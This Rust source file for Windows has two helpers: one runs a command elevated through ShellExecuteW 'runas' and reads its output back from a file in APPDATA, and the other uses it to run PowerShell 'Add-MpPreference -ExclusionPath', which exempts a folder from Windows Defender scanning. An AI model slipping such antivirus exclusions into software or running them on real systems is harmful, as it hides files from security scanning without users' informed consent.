#[cfg(windows)]
use std::os::windows::ffi::OsStrExt;
#[cfg(windows)]
use winapi::um::shellapi::ShellExecuteW;

use std::env;
use std::ffi::OsString;
use std::ptr;
use std::fs::File;
use std::io::Read;

#[cfg(windows)]
pub fn spawn_admin_process_and_get_output(command: &str, args: Vec<&str>) -> Result<String, String> {
    let cwd = env::current_dir().map_err(|_| "Failed to get cwd")?;
    let cwd_str = cwd.to_str().ok_or("Invalid path")?;
    let appdata = env::var("APPDATA").map_err(|_| "No APPDATA")?;
    let output_file = std::path::PathBuf::from(appdata).join("out");
    let output_file_str = output_file.to_str().ok_or("Invalid path")?;

    let cwd_wide: Vec<u16> = OsString::from(cwd_str).encode_wide().chain(Some(0)).collect();
    let verb_wide: Vec<u16> = OsString::from("runas").encode_wide().chain(Some(0)).collect();
    let command_wide: Vec<u16> = OsString::from(command).encode_wide().chain(Some(0)).collect();
    
    let mut params = args.join(" ");
    params.push_str(&format!(" > \"{}\"", output_file_str));
    let params_wide: Vec<u16> = OsString::from(params).encode_wide().chain(Some(0)).collect();
    
    let result = unsafe { ShellExecuteW(ptr::null_mut(), verb_wide.as_ptr(), command_wide.as_ptr(), params_wide.as_ptr(), cwd_wide.as_ptr(), 0) };
    if result as isize <= 32 { return Err("Failed to execute".into()); }
    std::thread::sleep(std::time::Duration::from_millis(1500));
    
    let mut file = File::open(output_file).map_err(|e| e.to_string())?;
    let mut file_data = Vec::new();
    file.read_to_end(&mut file_data).map_err(|e| e.to_string())?;
    
    let wide_data: Vec<u16> = file_data.chunks_exact(2).map(|c| (c[1] as u16) << 8 | c[0] as u16).collect();
    Ok(String::from_utf16(&wide_data).unwrap_or_default())
}

#[cfg(windows)]
pub fn add_windows_defender_exclusions(folder_path: &str) -> Result<bool, String> {
    let cmd = format!("Add-MpPreference -ExclusionPath \"{}\"", folder_path);
    spawn_admin_process_and_get_output("powershell", vec!["-Command", &cmd])?;
    Ok(true)
}

#[cfg(not(windows))]
pub fn add_windows_defender_exclusions(_: &str) -> Result<bool, String> { Ok(true) }